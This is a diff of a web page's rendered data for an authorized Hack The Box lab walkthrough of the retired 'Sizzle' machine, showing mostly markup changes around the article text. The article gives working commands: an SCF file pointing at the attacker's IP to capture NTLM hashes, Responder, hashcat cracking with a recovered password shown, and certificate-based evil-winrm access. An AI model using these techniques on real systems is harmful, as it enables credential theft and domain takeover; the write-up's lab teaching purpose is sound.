@@ -1,19 +1,18 @@
 1:"$Sreact.fragment"
-2:I[8500,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],""]
-3:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"ThemeToggle"]
-4:I[7549,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"MobileNavigation"]
-10:I[8945,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"ArticleReadingGuide"]
-12:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"ThemeAutoReset"]
-14:I[484,[],"OutletBoundary"]
-15:"$Sreact.suspense"
-0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L3",null,{}],["$","$L2",null,{"className":"utility-link","href":"/contact#professional-enquiries","children":["Contact Abdullah ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L4",null,{"items":[{"label":"About","href":"/about"},{"label":"Projects","href":"/projects"},{"label":"Research","href":"/research"},{"label":"Writing","href":"/writing"},{"label":"Services","href":"/services"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","data-motion":"hero","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Sizzle Walkthrough"}],["$","p",null,{"className":"article-dek","children":"A writable SMB share enables SCF-based NTLM capture and certificate-authenticated WinRM access, after which a recovered privileged hash leads to DCSync and Administrator access."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T16:09:45.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[15," minutes"]}]]}],null,["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-sizzle-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Sizzle machine avatar","loading":"lazy","decoding":"async","fetchPriority":"low"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Sizzle machine artwork, used for identification. Hack The Box is not affiliated with CyberKareem."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/sizzle","target":"_blank","rel":"nofollow noopener noreferrer","children":["Official Hack The Box machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","data-motion":"section","children":[["$","aside",null,{"className":"article-context","aria-label":"Article context","children":["$L5","$L6","$L7",["$L8","$L9","$La"]]}],"$Lb"]}]]}],null,"$Lc"]}],"$Ld","$Le"],null,"$Lf"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"DK8DoHECLNCy57ryKFrJF"}
-5:["$","$L10",null,{"headings":[{"id":"introduction","label":"Introduction"},{"id":"phase-1-initial-reconnaissance","label":"Phase 1: Initial Reconnaissance"},{"id":"phase-2-smb-enumeration-finding-the-entry-point","label":"Phase 2: SMB Enumeration: Finding the Entry Point"},{"id":"phase-3-the-scf-attack-capturing-hashes","label":"Phase 3: The SCF Attack: Capturing Hashes"},{"id":"phase-4-hash-cracking-from-hash-to-password","label":"Phase 4: Hash Cracking: From Hash to Password"},{"id":"phase-5-active-directory-certificate-services-adcs","label":"Phase 5: Active Directory Certificate Services (ADCS)"},{"id":"phase-6-certificate-based-winrm-authentication","label":"Phase 6: Certificate-Based WinRM Authentication"},{"id":"phase-7-post-exploitation-and-the-shortcut","label":"Phase 7: Post-Exploitation & The Shortcut"},{"id":"phase-8-dcsync-stealing-the-domain","label":"Phase 8: DCSync: Stealing the Domain"},{"id":"phase-9-pass-the-hash-becoming-system","label":"Phase 9: Pass-the-Hash: Becoming SYSTEM"},{"id":"review-notes","label":"Review notes"},{"id":"full-command-reference","label":"Full Command Reference"}]}]
-6:["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Source"}],[["$","p",null,{"children":"Technical source and supporting notes."}],["$","a",null,{"href":"https://github.com/CyberKareem/OSEP-Prep/blob/540ce46f57834e2f55146507411aac9f3229ed42/HTB-Sizzle.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision",["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","small",null,{"children":["CyberKareem/OSEP-Prep",", commit 540ce46f5783",""]}]]]}]
-7:["$","div",null,{"className":"article-review-note article-review-lab-safety","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Sizzle, Windows, Insane",". Retirement verified ","12 Jul 2026","."," ","This walkthrough covers an authorized lab. Use these techniques only on systems you own or are explicitly authorized to test."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/sizzle","target":"_blank","rel":"nofollow noopener noreferrer","children":["View public machine page ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]
-8:["$","div","source-context-0",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"Source context"}],["$","p",null,{"children":"Based on Abdullah Kareem's public preparation notes and edited for clarity. Commands and technical claims remain tied to the documented lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
-9:["$","div","editorial-correction-1",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"38 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
-a:["$","div","technical-clarification-2",{"className":"article-review-note article-review-technical-clarification","children":[["$","span",null,{"children":"Technical clarification"}],["$","p",null,{"children":"Technical clarification: one normal password change invalidates the preceding NT hash for ordinary Pass-the-Hash use. DCSync remediation depends on the actual compromise scope; it does not automatically require forest recovery in every incident."}],null]}]
-11:T7676,<p><strong>Machine:</strong> Sizzle<br><strong>OS:</strong> Windows (Active Directory)<br><strong>Difficulty:</strong> Insane<br><strong>Target IP:</strong> <code>10.129.1.1</code><br><strong>Attacker IP:</strong> <code>10.10.14.6</code>  </p>
+2:I[8500,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],""]
+3:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"ThemeToggle"]
+4:I[7549,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"MobileNavigation"]
+f:I[8945,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"ArticleReadingGuide"]
+11:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"ThemeAutoReset"]
+13:I[484,[],"OutletBoundary"]
+14:"$Sreact.suspense"
+0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L3",null,{}],["$","$L2",null,{"className":"utility-link","href":"/contact#professional-enquiries","children":["Contact Abdullah ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L4",null,{"items":[{"label":"About","href":"/about"},{"label":"Projects","href":"/projects"},{"label":"Research","href":"/research"},{"label":"Writing","href":"/writing"},{"label":"Services","href":"/services"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","div",null,{"className":"article-hero-copy","data-motion":"hero","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Sizzle Walkthrough"}],["$","p",null,{"className":"article-dek","children":"A writable SMB share enables SCF-based NTLM capture and certificate-authenticated WinRM access, after which a recovered privileged hash leads to DCSync and Administrator access."}],["$","aside",null,{"className":"article-signal-deck article-signal-deck-htb","data-article-signal-kind":"lab","data-motion-surface":"instrument","aria-label":"Article orientation","children":[null,[["$","div",null,{"className":"article-signal-lab-node","aria-hidden":"true","children":[["$","span",null,{}],["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}]]}],["$","div",null,{"className":"article-signal-heading article-signal-lab-identity","children":[["$","span",null,{"children":"Authorized retired lab"}],["$","strong",null,{"children":"Sizzle"}],["$","small",null,{"children":"Hack The Box machine record"}],"$L5"]}],"$L6","$L7"],null,null]}]]}],"$L8"]}],"$L9","$La"]}],null,"$Lb"]}],"$Lc","$Ld"],null,"$Le"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"MVJfiMbnmqcLVn86bgJ_V"}
+5:["$","a",null,{"className":"article-signal-source","href":"https://www.hackthebox.com/machines/sizzle","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open public machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]
+6:["$","dl",null,{"className":"article-signal-metrics article-signal-lab-metrics","children":[["$","div",null,{"className":"article-signal-metric","children":[["$","dt",null,{"children":"Operating system"}],["$","dd",null,{"children":"Windows"}]]}],["$","div",null,{"className":"article-signal-metric","children":[["$","dt",null,{"children":"Difficulty"}],["$","dd",null,{"children":"Insane"}]]}],["$","div",null,{"className":"article-signal-metric article-signal-metric-lab-state","children":[["$","dt",null,{"children":"Machine state"}],["$","dd",null,{"children":"Retired"}]]}],["$","div",null,{"className":"article-signal-metric","children":[["$","dt",null,{"children":"Retirement verified"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-07-12","children":"12 Jul 2026"}]}]]}]]}]
+7:["$","p",null,{"className":"article-signal-byline","children":["Published ","11 Jun 2026"," · ","Abdullah Kareem"]}]
+8:["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-sizzle-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Sizzle machine avatar","loading":"lazy","decoding":"async","fetchPriority":"low"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Sizzle machine artwork, used for identification. Hack The Box is not affiliated with CyberKareem."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/sizzle","target":"_blank","rel":"nofollow noopener noreferrer","children":["Official Hack The Box machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]
+9:["$","div",null,{"className":"article-rule"}]
+10:T7d6b,<p><strong>Machine:</strong> Sizzle<br><strong>OS:</strong> Windows (Active Directory)<br><strong>Difficulty:</strong> Insane<br><strong>Target IP:</strong> <code>10.129.1.1</code><br><strong>Attacker IP:</strong> <code>10.10.14.6</code>  </p>
 <hr>
 
 
@@ -24,7 +23,7 @@ a:["$","div","technical-clarification-2",{"className":"article-review-note artic
 <p><strong>The difficulty rating measures the complexity of individual steps, not the number of steps. A well-chosen path through an Insane box can be faster than a Medium box with a long, winding road.</strong></p>
 </blockquote>
 <p>The machine's core vulnerability chain is elegant:</p>
-<pre><code>Writable SMB Share → NTLM Hash Capture → Crack → ADCS Certificate → WinRM Shell → DCSync → Domain Admin
+<pre tabindex="0" aria-label="Code or terminal block 1"><code>Writable SMB Share → NTLM Hash Capture → Crack → ADCS Certificate → WinRM Shell → DCSync → Domain Admin
 </code></pre>
 <p>The chain combines forced authentication, ADCS certificate enrollment, WinRM, and DCSync. Its impact comes from several smaller Active Directory misconfigurations working together.</p>
 <hr>
@@ -32,7 +31,7 @@ a:["$","div","technical-clarification-2",{"className":"article-review-note artic
 <h3 id="what-is-this-machine-telling-me">"What is this machine telling me?"</h3>
 <p>Start by collecting hostnames, services, and other details exposed by the target.</p>
 <h3 id="step-1-1-port-scanning-with-nmap">Step 1.1: Port Scanning with Nmap</h3>
-<pre><code class="language-bash" data-language="bash">nmap -p- -sS --open --min-rate 5000 -Pn -n -vvv -oG allPorts 10.129.1.1
+<pre tabindex="0" aria-label="bash code or terminal block 2"><code class="language-bash" data-language="bash">nmap -p- -sS --open --min-rate 5000 -Pn -n -vvv -oG allPorts 10.129.1.1
 </code></pre>
 <p><strong>What this command does:</strong></p>
 <ul>
@@ -46,7 +45,7 @@ a:["$","div","technical-clarification-2",{"className":"article-review-note artic
 </ul>
 <p> You can't attack what you don't know exists. A full port scan is the foundation of everything.</p>
 <h3 id="step-1-2-service-version-detection">Step 1.2: Service Version Detection</h3>
-<pre><code class="language-bash" data-language="bash">nmap -p21,53,80,135,139,389,443,445,464,593,636,3268,3269,5985,5986 -sCV -Pn -n -vvv -oN targeted 10.129.1.1
+<pre tabindex="0" aria-label="bash code or terminal block 3"><code class="language-bash" data-language="bash">nmap -p21,53,80,135,139,389,443,445,464,593,636,3268,3269,5985,5986 -sCV -Pn -n -vvv -oN targeted 10.129.1.1
 </code></pre>
 <p><strong>Key ports discovered and what they mean:</strong></p>
 <table tabindex="0" aria-label="Step 1.2: Service Version Detection data table">
@@ -110,10 +109,10 @@ a:["$","div","technical-clarification-2",{"className":"article-review-note artic
 <p><strong>If you can write to an SMB share that other users access, you can force those users to authenticate to you. And when Windows authenticates, it sends hashes.</strong></p>
 </blockquote>
 <h3 id="step-2-1-listing-available-shares">Step 2.1: Listing Available Shares</h3>
-<pre><code class="language-bash" data-language="bash">smbclient -N -L //10.129.1.1
+<pre tabindex="0" aria-label="bash code or terminal block 4"><code class="language-bash" data-language="bash">smbclient -N -L //10.129.1.1
 </code></pre>
 <p><strong>Output analysis:</strong></p>
-<pre><code>Sharename       Type      Comment
+<pre tabindex="0" aria-label="Code or terminal block 5"><code>Sharename       Type      Comment
 ---------       ----      -------
 ADMIN$          Disk      Remote Admin
 C$              Disk      Default share
@@ -135,21 +134,21 @@ SYSVOL          Disk      Logon server share
 </ul>
 <p> Non-default shares (<code>Department Shares</code>, <code>Operations</code>) are created by administrators for business purposes. Business convenience often trumps security. <strong>prioritize non-default shares in your enumeration.</strong></p>
 <h3 id="step-2-2-accessing-the-department-shares">Step 2.2: Accessing the Department Shares</h3>
-<pre><code class="language-bash" data-language="bash">smbclient "\\10.129.1.1\Department Shares" -N
+<pre tabindex="0" aria-label="bash code or terminal block 6"><code class="language-bash" data-language="bash">smbclient "\\10.129.1.1\Department Shares" -N
 </code></pre>
 <p>Or, more conveniently, mount it locally:</p>
-<pre><code class="language-bash" data-language="bash">sudo mkdir -p /mnt/sizzle
+<pre tabindex="0" aria-label="bash code or terminal block 7"><code class="language-bash" data-language="bash">sudo mkdir -p /mnt/sizzle
 sudo mount -t cifs '//10.129.1.1/Department Shares' /mnt/sizzle -o username=guest,password=
 </code></pre>
 <p><strong>Why mount it?</strong> Because once mounted, you can use all your Linux tools (<code>find</code>, <code>tree</code>, <code>touch</code>, scripts) to enumerate it. This is faster than navigating through <code>smbclient</code>'s interactive shell.</p>
 <h3 id="step-2-3-finding-writable-directories">Step 2.3: Finding Writable Directories</h3>
 <p>After mounting, we explore:</p>
-<pre><code class="language-bash" data-language="bash">cd /mnt/sizzle &amp;&amp; ls
+<pre tabindex="0" aria-label="bash code or terminal block 8"><code class="language-bash" data-language="bash">cd /mnt/sizzle &amp;&amp; ls
 </code></pre>
 <p>We see many department folders: <code>Accounting</code>, <code>Audit</code>, <code>Banking</code>, <code>CEO_protected</code>, <code>Devops</code>, <code>Finance</code>, <code>HR</code>, <code>Infosec</code>, <code>Infrastructure</code>, <code>IT</code>, <code>Legal</code>, <code>M&amp;A</code>, <code>Marketing</code>, <code>R&amp;D</code>, <code>Sales</code>, <code>Security</code>, <code>Tax</code>, <code>Users</code>, <code>ZZ_ARCHIVE</code>.</p>
 <p><strong>The critical question:</strong> Which of these can we write to?</p>
 <p>We create a simple test script:</p>
-<pre><code class="language-bash" data-language="bash">#!/bin/bash
+<pre tabindex="0" aria-label="bash code or terminal block 9"><code class="language-bash" data-language="bash">#!/bin/bash
 list=$(find /mnt/sizzle -type d)
 for d in $list; do
     touch $d/x 2&gt;/dev/null
@@ -182,7 +181,7 @@ done
 <p>If any of these operations reference a remote resource (like <code>\\attacker-ip\share\icon.ico</code>), Windows will <strong>automatically attempt to authenticate</strong> to that remote server using the current user's credentials.</p>
 <h3 id="step-3-1-understanding-the-scf-file">Step 3.1: Understanding the SCF File</h3>
 <p>SCF stands for <strong>Shell Command File</strong>. It's a legacy Windows format used for folder customization. The key feature:</p>
-<pre><code class="language-scf" data-language="scf">[Shell]
+<pre tabindex="0" aria-label="scf code or terminal block 10"><code class="language-scf" data-language="scf">[Shell]
 Command=2
 IconFile=\\10.10.14.6\share\icon
 [Taskbar]
@@ -197,7 +196,7 @@ Command=ToggleDesktop
 </ul>
 <h3 id="step-3-2-setting-up-responder">Step 3.2: Setting Up Responder</h3>
 <p>Responder is a tool that listens for LLMNR, NBT-NS, and MDNS broadcast requests, and poisons them to capture authentication attempts.</p>
-<pre><code class="language-bash" data-language="bash">sudo responder -I tun0
+<pre tabindex="0" aria-label="bash code or terminal block 11"><code class="language-bash" data-language="bash">sudo responder -I tun0
 </code></pre>
 <p><strong>What Responder does:</strong></p>
 <ul>
@@ -207,7 +206,7 @@ Command=ToggleDesktop
 <li>Responder saves it.</li>
 </ul>
 <h3 id="step-3-3-deploying-the-scf-file">Step 3.3: Deploying the SCF File</h3>
-<pre><code class="language-bash" data-language="bash">cat &lt;&lt; 'EOF' &gt; sizzle.scf
+<pre tabindex="0" aria-label="bash code or terminal block 12"><code class="language-bash" data-language="bash">cat &lt;&lt; 'EOF' &gt; sizzle.scf
 [Shell]
 Command=2
 IconFile=\\10.10.14.6\share\icon
@@ -225,7 +224,7 @@ sudo cp sizzle.scf /mnt/sizzle/Users/Public/
 </ul>
 <h3 id="step-3-4-capturing-the-hash">Step 3.4: Capturing the Hash</h3>
 <p>Within seconds to minutes, Responder catches an authentication:</p>
-<pre><code>[SMB] NTLMv2-SSP Client   : 10.129.1.1
+<pre tabindex="0" aria-label="Code or terminal block 13"><code>[SMB] NTLMv2-SSP Client   : 10.129.1.1
 [SMB] NTLMv2-SSP Username : HTB\amanda
 [SMB] NTLMv2-SSP Hash     : amanda::HTB:1122334455667788:REDACTED_HASH_OR_FLAG:0101000000000000...
 </code></pre>
@@ -235,12 +234,12 @@ sudo cp sizzle.scf /mnt/sizzle/Users/Public/
 <h3 id="can-i-turn-this-hash-into-something-usable">"Can I turn this hash into something usable?"</h3>
 <p>An NTLMv2 hash is not a password - it's a <strong>challenge-response</strong>. It proves the client knows the password, but it doesn't reveal the password directly. However, if the password is weak, we can "crack" it by trying millions of passwords until we find one that produces the same response.</p>
 <h3 id="step-4-1-saving-the-hash">Step 4.1: Saving the Hash</h3>
-<pre><code class="language-bash" data-language="bash">cat &lt;&lt; 'EOF' &gt; amanda.hash
+<pre tabindex="0" aria-label="bash code or terminal block 14"><code class="language-bash" data-language="bash">cat &lt;&lt; 'EOF' &gt; amanda.hash
 amanda::HTB:1122334455667788:REDACTED_HASH_OR_FLAG:REDACTED_ENCODED_LAB_MATERIAL
 EOF
 </code></pre>
 <h3 id="step-4-2-cracking-with-hashcat">Step 4.2: Cracking with Hashcat</h3>
-<pre><code class="language-bash" data-language="bash">hashcat -m 5600 amanda.hash /usr/share/wordlists/rockyou.txt
+<pre tabindex="0" aria-label="bash code or terminal block 15"><code class="language-bash" data-language="bash">hashcat -m 5600 amanda.hash /usr/share/wordlists/rockyou.txt
 </code></pre>
 <p><strong>Why hashcat mode 5600?</strong></p>
 <ul>
@@ -253,7 +252,7 @@ EOF
 <li>It remains one of the most effective wordlists because humans are predictable.</li>
 </ul>
 <h3 id="step-4-3-the-result">Step 4.3: The Result</h3>
-<pre><code>Ashare1972       (amanda)
+<pre tabindex="0" aria-label="Code or terminal block 16"><code>Ashare1972       (amanda)
 </code></pre>
 <p> <code>Ashare1972</code> is a weak password. It follows a common pattern: <strong>Name fragment + word + year</strong>. This is exactly the kind of password corporate users create when forced to follow "complexity requirements" without understanding security.</p>
 <blockquote>
@@ -263,10 +262,10 @@ EOF
 <h2 id="phase-5-active-directory-certificate-services-adcs">Phase 5: Active Directory Certificate Services (ADCS)</h2>
 <h3 id="why-can-t-i-just-winrm-with-this-password">"Why can't I just WinRM with this password?"</h3>
 <p>With credentials in hand, the natural next step is:</p>
-<pre><code class="language-bash" data-language="bash">evil-winrm -i 10.129.1.1 -u amanda -p REDACTED
+<pre tabindex="0" aria-label="bash code or terminal block 17"><code class="language-bash" data-language="bash">evil-winrm -i 10.129.1.1 -u amanda -p REDACTED
 </code></pre>
 <p>But this fails with a strange error:</p>
-<pre><code>Error: Unable to parse authorization header. Headers: {...} Body: (401)
+<pre tabindex="0" aria-label="Code or terminal block 18"><code>Error: Unable to parse authorization header. Headers: {...} Body: (401)
 </code></pre>
 <p><strong>Why does this happen?</strong></p>
 <p>This machine has a policy that <strong>disables password-based WinRM authentication</strong>. Instead, it requires <strong>certificate-based authentication</strong>. This is actually a security feature - but like all security features, it creates new attack surface.</p>
@@ -280,12 +279,12 @@ EOF
 <p>The <code>/certsrv</code> endpoint is a web interface where authenticated users can request certificates. And guess what? <code>amanda</code> is an authenticated user.</p>
 <h3 id="step-5-1-discovering-the-certsrv-endpoint">Step 5.1: Discovering the certsrv Endpoint</h3>
 <p>During web enumeration, directory brute-forcing reveals:</p>
-<pre><code>/certsrv          (Status: 401)
+<pre tabindex="0" aria-label="Code or terminal block 19"><code>/certsrv          (Status: 401)
 </code></pre>
 <p>The <code>401</code> status means it requires authentication. We have credentials, so we can access it.</p>
 <h3 id="step-5-2-generating-a-certificate-signing-request-csr">Step 5.2: Generating a Certificate Signing Request (CSR)</h3>
 <p>To get a certificate, we first need to create a private key and a Certificate Signing Request (CSR). The CSR contains our public key and identity information, which the Certificate Authority (CA) will sign.</p>
-<pre><code class="language-bash" data-language="bash">openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr
+<pre tabindex="0" aria-label="bash code or terminal block 20"><code class="language-bash" data-language="bash">openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr
 </code></pre>
 <p><strong>What this does:</strong></p>
 <ul>
@@ -321,7 +320,7 @@ EOF
 </ul>
 <h3 id="step-6-1-connecting-with-evil-winrm">Step 6.1: Connecting with evil-winrm</h3>
 <p>Evil-winrm supports certificate authentication:</p>
-<pre><code class="language-bash" data-language="bash">evil-winrm -S -c certnew.cer -k amanda.key -i 10.129.1.1 -u 'amanda' -p REDACTED
+<pre tabindex="0" aria-label="bash code or terminal block 21"><code class="language-bash" data-language="bash">evil-winrm -S -c certnew.cer -k amanda.key -i 10.129.1.1 -u 'amanda' -p REDACTED
 </code></pre>
 <p><strong>Parameters explained:</strong></p>
 <ul>
@@ -332,7 +331,7 @@ EOF
 <li><code>-p 'Ashare1972'</code> : Still needed for some evil-winrm internals, even though auth is certificate-based</li>
 </ul>
 <p><strong>Success:</strong></p>
-<pre><code class="language-powershell" data-language="powershell">*Evil-WinRM* PS C:\Users\amanda\Documents&gt; whoami
+<pre tabindex="0" aria-label="powershell code or terminal block 22"><code class="language-powershell" data-language="powershell">*Evil-WinRM* PS C:\Users\amanda\Documents&gt; whoami
 htb\amanda
 </code></pre>
 
@@ -343,7 +342,7 @@ htb\amanda
 <p>Once inside, most beginners immediately start uploading enumeration tools. But the experienced hacker first asks:</p>
 
 <h3 id="step-7-1-checking-the-shell-environment">Step 7.1: Checking the Shell Environment</h3>
-<pre><code class="language-powershell" data-language="powershell">$ExecutionContext.SessionState.LanguageMode
+<pre tabindex="0" aria-label="powershell code or terminal block 23"><code class="language-powershell" data-language="powershell">$ExecutionContext.SessionState.LanguageMode
 </code></pre>
 <p>Output: <code>ConstrainedLanguage</code></p>
 <p><strong>What is ConstrainedLanguage mode?</strong></p>
@@ -355,10 +354,10 @@ htb\amanda
 <p>This means we can't easily run SharpHound, certain PowerShell download cradles, or .NET executables from memory. We would need a bypass (like PSBypassCLM) to escalate to <code>FullLanguage</code> mode.</p>
 <p><strong>But wait</strong> - do we need a better shell right now?</p>
 <h3 id="step-7-2-the-shortcut-file-txt">Step 7.2: The Shortcut: file.txt</h3>
-<pre><code class="language-powershell" data-language="powershell">type C:\Windows\system32\file.txt
+<pre tabindex="0" aria-label="powershell code or terminal block 24"><code class="language-powershell" data-language="powershell">type C:\Windows\system32\file.txt
 </code></pre>
 <p><strong>Output:</strong></p>
-<pre><code>krbtgt:502:REDACTED_HASH_OR_FLAG:REDACTED_HASH_OR_FLAG:::
+<pre tabindex="0" aria-label="Code or terminal block 25"><code>krbtgt:502:REDACTED_HASH_OR_FLAG:REDACTED_HASH_OR_FLAG:::
 Administrator:500:REDACTED_HASH_OR_FLAG:REDACTED_HASH_OR_FLAG:::
 
 Domain    User  ID  Hash
@@ -393,7 +392,7 @@ mrlky:1603:REDACTED_HASH_OR_FLAG:REDACTED_HASH_OR_FLAG:::
 
